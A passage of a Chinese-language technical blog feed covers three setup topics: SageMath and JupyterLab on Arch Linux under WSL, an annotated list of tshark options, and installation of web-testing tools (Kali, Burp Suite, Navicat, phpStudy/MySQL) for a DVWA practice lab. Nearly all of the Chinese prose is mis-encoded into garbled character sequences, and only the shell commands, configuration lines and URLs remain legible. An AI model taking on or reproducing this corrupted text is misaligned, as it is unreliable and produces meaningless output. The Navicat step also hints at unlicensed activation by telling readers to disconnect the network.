<p>åœ¨ç®¡ç†å‘˜æ¨¡å¼ä¸‹æ‰“å¼€ PowerShell æˆ– Windows å‘½ä»¤æç¤ºç¬¦ï¼Œæ–¹æ³•æ˜¯å³é”®å•å‡»å¹¶é€‰æ‹©â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ï¼Œè¾“å…¥ wsl --install å‘½ä»¤ï¼Œç„¶åé‡å¯è®¡ç®—æœºã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>
<p><em>é»˜è®¤å®‰è£…çš„æ˜¯Ubuntu</em></p>
<p>éœ€è¦æ³¨æ„ï¼šå…³é”®ä¸€æ­¥æ˜¯åœ¨æ§åˆ¶é¢æ¿-å¯ç”¨æˆ–å…³é—­windowsåŠŸèƒ½ä¸­å‹¾é€‰<strong>é€‚ç”¨äºLinuxçš„windowså­ç³»ç»Ÿ</strong></p>
<h2 id="æ£€æŸ¥æ­£åœ¨è¿è¡Œçš„wslç‰ˆæœ¬">æ£€æŸ¥æ­£åœ¨è¿è¡Œçš„wslç‰ˆæœ¬</h2>
<p>å¯åˆ—å‡ºå·²å®‰è£…çš„ Linux å‘è¡Œç‰ˆï¼Œå¹¶é€šè¿‡åœ¨ PowerShell æˆ– Windows å‘½ä»¤æç¤ºç¬¦ä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥æ£€æŸ¥æ¯ä¸ªå‘è¡Œç‰ˆçš„ WSL ç‰ˆæœ¬ï¼š<code>wsl -l -v</code>ã€‚</p>
<p>æŸ¥çœ‹æ‰€å®‰è£…çš„ <code>Linux</code> ç‰ˆæœ¬ï¼Œä½¿ç”¨å‘½ä»¤ï¼š <code>wsl --list</code> ã€‚</p>
<p>å¦‚æœ‰éœ€è¦ï¼Œä½¿ç”¨ä¸‹é¢å‘½ä»¤å°†ArchLinuxè®¾ä¸ºé»˜è®¤ç³»ç»Ÿï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wsl --set-default Arch</span><br><span class="line"><span class="comment"># å¦‚æœªä¿®æ”¹æœªé»˜è®¤ç³»ç»Ÿï¼Œåˆ™ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line">wsl -d Arch</span><br></pre></td></tr></table></figure>
<h2 id="é…ç½®pacman">é…ç½®pacman</h2>
<p>é…ç½®<code>pacman</code>é•œåƒæºï¼Œæ”¹ä¸ºå›½å†…çš„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>
<p>åå¢åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥ä¸‹é¢å‘½ä»¤ï¼Œé…ç½®pacman keyï¼š</p>
<p><strong>ATTENTION!</strong><br>
æ­¤å¤„é…ç½®ä¸å½“ä¼šåœ¨åç»­æ›´æ–°ç³»ç»Ÿä¸­ï¼ŒéªŒç­¾å‡ºç°é—®é¢˜ã€‚</p>
<blockquote>
<p>å‚è€ƒèµ„æ–™ï¼š<a href="https://github.com/yuk7/ArchWSL/issues/317">https://github.com/yuk7/ArchWSL/issues/317</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">killall gpg-agent</span><br><span class="line"><span class="built_in">rm</span> -rf /etc/pacman.d/gnupg/</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line">pacman-key --populate archlinux</span><br><span class="line">pacman -Sy archlinux-keyring</span><br></pre></td></tr></table></figure>
<p><strong>æ›´æ–°ç³»ç»Ÿï¼š</strong>ï¼ˆéå¸¸å…³é”®ï¼Œä¸æ›´æ–°åç»­å®‰è£… jupyter notebook ä¼šå‡ºé”™ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syu</span><br></pre></td></tr></table></figure>
<p>é…ç½®archlinuxcné•œåƒæºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br></pre></td></tr></table></figure>
<p>å¢åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>
<p>å®‰è£…archlinuxcnçš„keyï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Sy archlinuxcn-keyring</span><br></pre></td></tr></table></figure>
<h2 id="é…ç½®ç”¨æˆ·">é…ç½®ç”¨æˆ·</h2>
<p>æ·»åŠ ç”¨æˆ·åä»¥åŠå¯¹åº”å¯†ç å³å¯ã€‚</p>
<h1>å®‰è£…sage</h1>
<p>ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy sagemath</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å³å¯ã€‚<br>
å®‰è£…å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sage</span><br></pre></td></tr></table></figure>
<p>æ¥å¯åŠ¨ sage æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸã€‚æŸ¥çœ‹å®Œåä½¿ç”¨ exit é€€å‡ºå³å¯ã€‚</p>
<h2 id="å®‰è£…-JupyterLab">å®‰è£… JupyterLab</h2>
<p>ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S jupyterlab (æˆ–è€…æ”¹ä¸º jupyter notebook)</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å³å¯</p>
<h2 id="åœ¨-JupyterLab-ä¸­-å¯åŠ¨-Sage">åœ¨ JupyterLab ä¸­ å¯åŠ¨ Sage</h2>
<p>åœ¨ ArchLinux ä¸­ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sage -n jupyterlab --no-browser --allow-root</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶å¯ä»¥ä½¿ç”¨è·³è½¬å‡ºæ¥çš„çª—å£é‡Œé¢åŒ…å«çš„<code>token</code>ã€‚</p>
<p>ä½¿ç”¨vscode + jupyter notebook serverçš„å½¢å¼ï¼Œä»è€Œå®ç°<code>sagemath10</code>çš„æœåŠ¡å™¨è°ƒç”¨ã€‚</p>
<p>é€€å‡ºæ—¶ä½¿ç”¨Â <code>ctrl+c</code>Â å³å¯ã€‚</p>
<h1>sageä¸­å®‰è£…ç¬¬ä¸‰æ–¹åº“</h1>
<p>è™½ç„¶ä¸çŸ¥é“åŸç†ï¼Œä½†æ˜¯ä¸»è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ç¬¬ä¸‰æ–¹åº“ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S python-pycryptdome</span><br><span class="line">pacman -S python-gmpy2</span><br><span class="line">pacman -S netcat(ç„¶åé»˜è®¤å®‰è£…å³å¯)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±èƒ½æŠŠå¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“å…ˆå®‰è£…åˆ°<code>sagemath 10</code>ã€‚</p>
<p>å…¶ä»–æœ‰éœ€è¦å†è¯´å§å“ˆå“ˆã€‚</p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>Environment</tag>
        <tag>sagemath</tag>
        <tag>wsl2</tag>
      </tags>
  </entry>
  <entry>
    <title>Tshark&amp;tcpdump</title>
    <url>/2023/11/06/tshark-tcpdump/</url>
    <content><![CDATA[<blockquote>
<p>reference:</p>
<p><a href="http://linux.51yip.com/search/tshark">tshark linux å‘½ä»¤ åœ¨çº¿ä¸­æ–‡æ‰‹å†Œ (51yip.com)</a></p>
<p><a href="http://linux.51yip.com/search/tcpdump">tcpdump linux å‘½ä»¤ åœ¨çº¿ä¸­æ–‡æ‰‹å†Œ (51yip.com)</a></p>
</blockquote>
<span id="more"></span><!--toc-->

<p>åœ¨Linuxä¸‹ï¼Œå½“æˆ‘ä»¬éœ€è¦æŠ“å–ç½‘ç»œæ•°æ®åŒ…åˆ†ææ—¶ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨tcpdumpæŠ“å–ç½‘ç»œrawæ•°æ®åŒ…å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åä¸‹è½½åˆ°æœ¬åœ°ä½¿ç”¨wiresharkç•Œé¢ç½‘ç»œåˆ†æå·¥å…·è¿›è¡Œç½‘ç»œåŒ…åˆ†æã€‚<br>æœ€è¿‘æ‰å‘ç°ï¼ŒåŸæ¥wiresharkä¹Ÿæä¾›æœ‰Linuxå‘½ä»¤è¡Œå·¥å…·-tsharkã€‚tsharkä¸ä»…æœ‰æŠ“åŒ…çš„åŠŸèƒ½ï¼Œè¿˜å¸¦äº†è§£æå„ç§åè®®çš„èƒ½åŠ›ã€‚ä¸‹é¢æˆ‘ä»¬ä»¥ä¸¤ä¸ªå®ä¾‹æ¥ä»‹ç»tsharkå·¥å…·ã€‚</p>
<p>ä¸»è¦å‚æ•°ï¼š</p>
<ol>
<li>æŠ“åŒ…æ¥å£ç±»</li>
<li>-i è®¾ç½®æŠ“åŒ…çš„ç½‘ç»œæ¥å£ï¼Œä¸è®¾ç½®åˆ™é»˜è®¤ä¸ºç¬¬ä¸€ä¸ªéè‡ªç¯æ¥å£ã€‚</li>
<li>-D åˆ—å‡ºå½“å‰å­˜åœ¨çš„ç½‘ç»œæ¥å£ã€‚åœ¨ä¸äº†è§£OSæ‰€æ§åˆ¶çš„ç½‘ç»œè®¾å¤‡æ—¶ï¼Œä¸€èˆ¬å…ˆç”¨â€œtshark -Dâ€æŸ¥çœ‹ç½‘ç»œæ¥å£çš„ç¼–å·ä»¥ä¾›-iå‚æ•°ä½¿ç”¨ã€‚</li>
<li>-f è®¾å®šæŠ“åŒ…è¿‡æ»¤è¡¨è¾¾å¼ï¼ˆcapture filter expressionï¼‰ã€‚æŠ“åŒ…è¿‡æ»¤è¡¨è¾¾å¼çš„å†™æ³•é›·åŒäºtcpdumpï¼Œå¯å‚è€ƒtcpdump man pageçš„æœ‰å…³éƒ¨åˆ†ã€‚</li>
<li>-s è®¾ç½®æ¯ä¸ªæŠ“åŒ…çš„å¤§å°ï¼Œé»˜è®¤ä¸º65535ï¼Œå¤šäºè¿™ä¸ªå¤§å°çš„æ•°æ®å°†ä¸ä¼šè¢«ç¨‹åºè®°å…¥å†…å­˜ã€å†™å…¥æ–‡ä»¶ã€‚ï¼ˆè¿™ä¸ªå‚æ•°ç›¸å½“äºtcpdumpçš„-sï¼Œtcpdumpé»˜è®¤æŠ“åŒ…çš„å¤§å°ä»…ä¸º68ï¼‰</li>
<li>-p è®¾ç½®ç½‘ç»œæ¥å£ä»¥éæ··åˆæ¨¡å¼å·¥ä½œï¼Œå³åªå…³å¿ƒå’Œæœ¬æœºæœ‰å…³çš„æµé‡ã€‚</li>
<li>-B è®¾ç½®å†…æ ¸ç¼“å†²åŒºå¤§å°ï¼Œä»…å¯¹windowsæœ‰æ•ˆã€‚</li>
<li>-y è®¾ç½®æŠ“åŒ…çš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œä¸è®¾ç½®åˆ™é»˜è®¤ä¸º-Læ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªåè®®ï¼Œå±€åŸŸç½‘ä¸€èˆ¬æ˜¯EN10MBç­‰ã€‚</li>
<li>-L åˆ—å‡ºæœ¬æœºæ”¯æŒçš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œä¾›-yå‚æ•°ä½¿ç”¨ã€‚  </li>
<li>æŠ“åŒ…åœæ­¢æ¡ä»¶</li>
<li>-c æŠ“å–çš„packetæ•°ï¼Œåœ¨å¤„ç†ä¸€å®šæ•°é‡çš„packetåï¼Œåœæ­¢æŠ“å–ï¼Œç¨‹åºé€€å‡ºã€‚</li>
<li>-a è®¾ç½®tsharkæŠ“åŒ…åœæ­¢å‘æ–‡ä»¶ä¹¦å†™çš„æ¡ä»¶ï¼Œäº‹å®ä¸Šæ˜¯tsharkåœ¨æ­£å¸¸å¯åŠ¨ä¹‹ååœæ­¢å·¥ä½œå¹¶è¿”å›çš„æ¡ä»¶ã€‚æ¡ä»¶å†™ä¸ºtest:valueçš„å½¢å¼ï¼Œå¦‚â€œ-a duration:5â€è¡¨ç¤ºtsharkå¯åŠ¨ååœ¨5ç§’å†…æŠ“åŒ…ç„¶ååœæ­¢ï¼›â€œ-a filesize:10â€è¡¨ç¤ºtsharkåœ¨è¾“å‡ºæ–‡ä»¶è¾¾åˆ°10kBååœæ­¢ï¼›â€œ-a files:nâ€è¡¨ç¤ºtsharkåœ¨å†™æ»¡nä¸ªæ–‡ä»¶ååœæ­¢ã€‚ï¼ˆwindowsç‰ˆçš„tshark0.99.3ç”¨å‚æ•°â€œ-a files:nâ€ä¸èµ·ä½œç”¨â€”â€”ä¼šæœ‰æ— æ•°å¤šä¸ªæ–‡ä»¶ç”Ÿæˆã€‚ç”±äº-bå‚æ•°æœ‰è‡ªå·±çš„fileså‚æ•°ï¼Œæ‰€è°“â€œå’Œ-bçš„å…¶å®ƒå‚æ•°ç»“åˆä½¿ç”¨â€æ— ä»è¯´èµ·ã€‚è¿™ä¹Ÿè®¸æ˜¯ä¸€ä¸ªbugï¼Œæˆ–tsharkçš„man pageçš„ä¹¦å†™æœ‰è¯¯ã€‚ï¼‰</li>
<li>æ–‡ä»¶è¾“å‡ºæ§åˆ¶</li>
<li>-b è®¾ç½®ring bufferæ–‡ä»¶å‚æ•°ã€‚ring bufferçš„æ–‡ä»¶åç”±-wå‚æ•°å†³å®šã€‚-bå‚æ•°é‡‡ç”¨test:valueçš„å½¢å¼ä¹¦å†™ã€‚â€œ-b duration:5â€è¡¨ç¤ºæ¯5ç§’å†™ä¸‹ä¸€ä¸ªring bufferæ–‡ä»¶ï¼›â€œ-b filesize:5â€è¡¨ç¤ºæ¯è¾¾åˆ°5kBå†™ä¸‹ä¸€ä¸ªring bufferæ–‡ä»¶ï¼›â€œ-b files:7â€è¡¨ç¤ºring bufferæ–‡ä»¶æœ€å¤š7ä¸ªï¼Œå‘¨è€Œå¤å§‹åœ°ä½¿ç”¨ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°ä¸è®¾å®šï¼Œtsharkä¼šå°†ç£ç›˜å†™æ»¡ä¸ºæ­¢ã€‚</li>
<li>æ–‡ä»¶è¾“å…¥</li>
<li>-r è®¾ç½®tsharkåˆ†æçš„è¾“å…¥æ–‡ä»¶ã€‚tsharkæ—¢å¯ä»¥æŠ“å–åˆ†æå³æ—¶çš„ç½‘ç»œæµé‡ï¼Œåˆå¯ä»¥åˆ†ædumpåœ¨æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚-rä¸èƒ½æ˜¯å‘½åç®¡é“å’Œæ ‡å‡†è¾“å…¥ã€‚</li>
<li>å¤„ç†ç±»</li>
<li>-R è®¾ç½®è¯»å–ï¼ˆæ˜¾ç¤ºï¼‰è¿‡æ»¤è¡¨è¾¾å¼ï¼ˆread filter expressionï¼‰ã€‚ä¸ç¬¦åˆæ­¤è¡¨è¾¾å¼çš„æµé‡åŒæ ·ä¸ä¼šè¢«å†™å…¥æ–‡ä»¶ã€‚æ³¨æ„ï¼Œè¯»å–ï¼ˆæ˜¾ç¤ºï¼‰è¿‡æ»¤è¡¨è¾¾å¼çš„è¯­æ³•å’Œåº•å±‚ç›¸å…³çš„æŠ“åŒ…è¿‡æ»¤è¡¨è¾¾å¼è¯­æ³•ä¸ç›¸åŒï¼Œå®ƒçš„è¯­æ³•è¡¨è¾¾è¦ä¸°å¯Œå¾—å¤šï¼Œè¯·å‚è€ƒ<a href="http://www.ethereal.com/docs/dfref/%E5%92%8Chttp://www.ethereal.com/docs/man-pages/ethereal-filter.4.html%E3%80%82%E7%B1%BB%E4%BC%BC%E4%BA%8E%E6%8A%93%E5%8C%85%E8%BF%87%E6%BB%A4%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%8C%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%E6%97%B6%E6%9C%80%E5%A5%BD%E5%B0%86%E5%AE%83%E4%BB%ACquote%E8%B5%B7%E6%9D%A5%E3%80%82">http://www.ethereal.com/docs/dfref/å’Œhttp://www.ethereal.com/docs/man-pages/ethereal-filter.4.htmlã€‚ç±»ä¼¼äºæŠ“åŒ…è¿‡æ»¤è¡¨è¾¾å¼ï¼Œåœ¨å‘½ä»¤è¡Œä½¿ç”¨æ—¶æœ€å¥½å°†å®ƒä»¬quoteèµ·æ¥ã€‚</a></li>
<li>-n ç¦æ­¢æ‰€æœ‰åœ°å€åå­—è§£æï¼ˆé»˜è®¤ä¸ºå…è®¸æ‰€æœ‰ï¼‰ã€‚</li>
<li>-N å¯ç”¨æŸä¸€å±‚çš„åœ°å€åå­—è§£æã€‚â€œmâ€ä»£è¡¨MACå±‚ï¼Œâ€œnâ€ä»£è¡¨ç½‘ç»œå±‚ï¼Œâ€œtâ€ä»£è¡¨ä¼ è¾“å±‚ï¼Œâ€œCâ€ä»£è¡¨å½“å‰å¼‚æ­¥DNSæŸ¥æ‰¾ã€‚å¦‚æœ-nå’Œ-Nå‚æ•°åŒæ—¶å­˜åœ¨ï¼Œ-nå°†è¢«å¿½ç•¥ã€‚å¦‚æœ-nå’Œ-Nå‚æ•°éƒ½ä¸å†™ï¼Œåˆ™é»˜è®¤æ‰“å¼€æ‰€æœ‰åœ°å€åå­—è§£æã€‚</li>
<li>-d å°†æŒ‡å®šçš„æ•°æ®æŒ‰æœ‰å…³åè®®è§£åŒ…è¾“å‡ºã€‚å¦‚è¦å°†tcp 8888ç«¯å£çš„æµé‡æŒ‰httpè§£åŒ…ï¼Œåº”è¯¥å†™ä¸ºâ€œ-d tcp.port&#x3D;&#x3D;8888,httpâ€ã€‚æ³¨æ„é€‰æ‹©å­å’Œè§£åŒ…åè®®ä¹‹é—´ä¸èƒ½ç•™ç©ºæ ¼ã€‚</li>
<li>è¾“å‡ºç±»</li>
<li>-w è®¾ç½®rawæ•°æ®çš„è¾“å‡ºæ–‡ä»¶ã€‚è¿™ä¸ªå‚æ•°ä¸è®¾ç½®ï¼Œtsharkå°†ä¼šæŠŠè§£ç ç»“æœè¾“å‡ºåˆ°stdoutã€‚â€œ-w-â€è¡¨ç¤ºæŠŠrawè¾“å‡ºåˆ°stdoutã€‚å¦‚æœè¦æŠŠè§£ç ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ï¼Œä½¿ç”¨é‡å®šå‘â€œ&gt;â€è€Œä¸è¦-wå‚æ•°ã€‚</li>
<li>-F è®¾ç½®è¾“å‡ºrawæ•°æ®çš„æ ¼å¼ï¼Œé»˜è®¤ä¸ºlibpcapã€‚â€œtshark -Fâ€ä¼šåˆ—å‡ºæ‰€æœ‰æ”¯æŒçš„rawæ ¼å¼ã€‚</li>
<li>-V è®¾ç½®å°†è§£ç ç»“æœçš„ç»†èŠ‚è¾“å‡ºï¼Œå¦åˆ™è§£ç ç»“æœä»…æ˜¾ç¤ºä¸€ä¸ªpacketä¸€è¡Œçš„summaryã€‚</li>
<li>-x è®¾ç½®åœ¨è§£ç è¾“å‡ºç»“æœä¸­ï¼Œæ¯ä¸ªpacketåé¢ä»¥HEX dumpçš„æ–¹å¼æ˜¾ç¤ºå…·ä½“æ•°æ®ã€‚</li>
<li>-T è®¾ç½®è§£ç ç»“æœè¾“å‡ºçš„æ ¼å¼ï¼ŒåŒ…æ‹¬text,ps,psmlå’Œpdmlï¼Œé»˜è®¤ä¸ºtextã€‚</li>
<li>-t è®¾ç½®è§£ç ç»“æœçš„æ—¶é—´æ ¼å¼ã€‚â€œadâ€è¡¨ç¤ºå¸¦æ—¥æœŸçš„ç»å¯¹æ—¶é—´ï¼Œâ€œaâ€è¡¨ç¤ºä¸å¸¦æ—¥æœŸçš„ç»å¯¹æ—¶é—´ï¼Œâ€œrâ€è¡¨ç¤ºä»ç¬¬ä¸€ä¸ªåŒ…åˆ°ç°åœ¨çš„ç›¸å¯¹æ—¶é—´ï¼Œâ€œdâ€è¡¨ç¤ºä¸¤ä¸ªç›¸é‚»åŒ…ä¹‹é—´çš„å¢é‡æ—¶é—´ï¼ˆdeltaï¼‰ã€‚</li>
<li>-S åœ¨å‘rawæ–‡ä»¶è¾“å‡ºçš„åŒæ—¶ï¼Œå°†è§£ç ç»“æœæ‰“å°åˆ°æ§åˆ¶å°ã€‚</li>
<li>-l åœ¨å¤„ç†æ¯ä¸ªåŒ…æ—¶å³æ—¶åˆ·æ–°è¾“å‡ºã€‚</li>
<li>-X æ‰©å±•é¡¹ã€‚</li>
<li>-q è®¾ç½®å®‰é™çš„stdoutè¾“å‡ºï¼ˆä¾‹å¦‚åšç»Ÿè®¡æ—¶ï¼‰</li>
<li>-z è®¾ç½®ç»Ÿè®¡å‚æ•°ã€‚</li>
<li>å…¶å®ƒ</li>
<li>-h æ˜¾ç¤ºå‘½ä»¤è¡Œå¸®åŠ©ã€‚</li>
<li>-v æ˜¾ç¤ºtsharkçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</li>
<li>-o é‡è½½é€‰é¡¹ã€‚</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Web-Commontools-Install</title>
    <url>/2024/12/02/web-commontools-install/</url>
    <content><![CDATA[<p>æœ¬æ–‡ç« ä¸»è¦ç®€å•ä»‹ç»äº†webç¯å¢ƒä¸€äº›å¸¸è§å·¥å…·çš„ä¸‹è½½ä»¥åŠå®‰è£…ï¼Œä»¥åŠä¸€äº›ç®€å•é¶åœºç¯å¢ƒï¼ˆDVWAï¼‰çš„æ­å»ºã€‚</p>
<span id="more"></span><!--toc-->
<h1>å®‰è£…VMware</h1>
<blockquote>
<p><a href="https://www.vmware.com/">VMware by Broadcom - Cloud Computing for the Enterprise</a></p>
</blockquote>
<ul>
<li>å®‰è£…VMware WorkStation Pro</li>
<li>å®‰è£…è™šæ‹Ÿç¯å¢ƒä¾¿äºå¤šå¹³å°é›†æˆä½¿ç”¨</li>
</ul>
<h1>å®‰è£…kali</h1>
<blockquote>
<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p>
</blockquote>
<img src="/2024/12/02/web-commontools-install/image-20241202183622627.png" class="" title="image-20241202183622627">
<p>ä¸‹è½½ä¸‹æ¥çš„å‹ç¼©åŒ…ï¼Œç›´æ¥è§£å‹ç¼©ï¼Œä½¿ç”¨VMwareæ‰“å¼€å¯¹åº”æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œå³å¯ç›´æ¥å¯¼å…¥kaliè™šæ‹Ÿç¯å¢ƒã€‚</p>
<p>é»˜è®¤ç”¨æˆ·åï¼škali</p>
<p>é»˜è®¤å¯†ç ï¼škali</p>
<h1>å®‰è£…Java</h1>
<blockquote>
<p><a href="https://blog.csdn.net/JasonXu94/article/details/143726390">Java8ï¼ˆJDK1.8ï¼‰æœ€æ–°ä¸‹è½½å®‰è£…æ•™ç¨‹ï¼Œé™„è¯¦ç»†å›¾æ–‡ï¼Œé€‚åˆæ–°æ‰‹ï¼Œå»ºè®®æ”¶è—_java 1.8ä¸‹è½½-CSDNåšå®¢</a></p>
</blockquote>
<ul>
<li>ä¸»è¦éœ€è¦é…ç½®<strong>ç¯å¢ƒå˜é‡</strong>
<ul>
<li>Path</li>
<li>åˆ›å»ºJAVA_HOMEï¼Œjdkçš„å®‰è£…è·¯å¾„</li>
</ul>
</li>
<li>æ§åˆ¶é¢æ¿-ç³»ç»Ÿ-é«˜çº§å±æ€§è®¾ç½®</li>
<li>æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ
<ul>
<li>è¿è¡Œ<code>java -version</code></li>
</ul>
</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202183547943.png" class="" title="image-20241202183547943">
<h1>å®‰è£…burpsuite</h1>
<h2 id="kali">kali</h2>
<p>kaliè‡ªå¸¦burpsuiteï¼Œä¸€èˆ¬ç›´æ¥è°ƒç”¨å·¥å…·åº“å³å¯ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202190344263.png" class="" title="image-20241202190344263">
<img src="/2024/12/02/web-commontools-install/image-20241202211219462.png" class="" title="image-20241202211219462">
<ul>
<li>
<p>åˆ©ç”¨<strong>burpsuiteè‡ªå¸¦çš„æµè§ˆå™¨</strong>ï¼Œä¸éœ€è¦é¢å¤–é…ç½®å°±å¯ä»¥å®ç°æŠ“åŒ…</p>
</li>
<li>
<p>éƒ¨åˆ†æ— æ³•è¿›è¡ŒæŠ“åŒ…ï¼Œå¯å‚è€ƒ<strong>æœ¬åœ°ç¯å¢ƒè¿›è¡Œé…ç½®</strong>å®ç°æŠ“åŒ…</p>
</li>
</ul>
<h2 id="æœ¬åœ°ç¯å¢ƒ">æœ¬åœ°ç¯å¢ƒ</h2>
<blockquote>
<p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter1.html">ç¬¬ä¸€ç«  Burp Suite å®‰è£…å’Œç¯å¢ƒé…ç½® Â· burpsuiteå®æˆ˜æŒ‡å—</a></p>
</blockquote>
<ul>
<li>æ¨èä½¿ç”¨firefoxæµè§ˆå™¨</li>
<li>å®‰è£…æ’ä»¶-FoxyProxy</li>
<li>Option-Proxyï¼Œè¿›è¡Œä»£ç†é…ç½®ï¼Œ<code>127.0.0.1:8080</code></li>
<li>è®¿é—®ï¼š<code>http://burp</code>è¿›è¡Œæµ‹è¯•
<ul>
<li>Intercept-off</li>
<li>æ’ä»¶ä»£ç†-on</li>
</ul>
</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202212152785.png" class="" title="image-20241202212152785">
<h1>å®‰è£…Navicat</h1>
<blockquote>
<p><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MjU4MTg2Ng==&amp;action=getalbum&amp;album_id=3421653652102742021">https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MjU4MTg2Ng==&amp;action=getalbum&amp;album_id=3421653652102742021</a></p>
</blockquote>
<ul>
<li>ä¸€å®šè®°å¾—æ–­ç½‘è¿›è¡Œå®ç°</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202212358986.png" class="" title="image-20241202212358986">
<h1>å®‰è£…PHP study+MySQL</h1>
<h2 id="é…ç½®MySQLç¯å¢ƒ">é…ç½®MySQLç¯å¢ƒ</h2>
<img src="/2024/12/02/web-commontools-install/image-20241202213657613.png" class="" title="image-20241202213657613">
<p>è¿›å…¥å‘½ä»¤è¡Œï¼Œä½¿ç”¨<code>mysql --version</code>å‘ç°æ²¡æˆåŠŸã€‚</p>
<p>æ‰“å¼€<code>ç½‘ç«™</code>ï¼Œè¿›å…¥æ ¹ç›®å½•ï¼Œè¿›å…¥<code>Extensions</code>ï¼ŒæŠŠ<code>MySQL</code>å¯¹åº”çš„ç›®å½•è¿›è¡Œå¤åˆ¶ã€‚</p>
<p>é…ç½®ç¯å¢ƒå˜é‡ï¼ŒæŠŠå¤åˆ¶çš„å˜é‡æ”¾åœ¨ç³»ç»Ÿå˜é‡ä¸­ã€‚</p>
<p>é»˜è®¤ç”¨æˆ·åä»¥åŠå¯†ç ä¸º<code>root</code>ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202214431254.png" class="" title="image-20241202214431254">
<p>å‘½ä»¤è¡Œç™»å½•ï¼š<code>mysql -u [username] -p</code>ï¼Œå›è½¦ä¹‹åå¡«å…¥mysqlå¯¹åº”çš„å¯†ç ã€‚</p>
<h2 id="é…ç½®Navicat-å¯¼å…¥sqlæ–‡ä»¶">é…ç½®Navicat+å¯¼å…¥sqlæ–‡ä»¶</h2>
<blockquote>
<p><a href="https://blog.csdn.net/tkf021004/article/details/136098343">ã€MySQLã€‘å¦‚ä½•è¿è¡Œsqlæ–‡ä»¶ï¼ˆä»¥Navicatåšæ¼”ç¤ºï¼‰_navicatè¿è¡Œsqlæ–‡ä»¶-CSDNåšå®¢</a></p>
</blockquote>
<p>åœ¨ä¸Šé¢æˆåŠŸçš„åŸºç¡€ä¸Šï¼Œæ–°å»ºè¿æ¥ï¼Œè¾“å…¥å¯¹åº”çš„ç”¨æˆ·åä»¥åŠå¯†ç ã€‚</p>
<p>æµ‹è¯•è¿æ¥ï¼Œè¿æ¥æˆåŠŸä¹‹åå³å¯å»ºç«‹è¿æ¥ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215004143.png" class="" title="image-20241202215004143">
<p><strong>å­—ç¬¦é›†ï¼š</strong><br>
å¦‚æœä½ çš„æ•°æ®åº“ç‰ˆæœ¬ä¸º5.x :é€‰æ‹©utf8<br>
å¦‚æœä½ çš„æ•°æ®åº“ç‰ˆæœ¬ä¸º8.0 :é€‰æ‹©utf8mb4</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215157884.png" class="" title="image-20241202215157884">
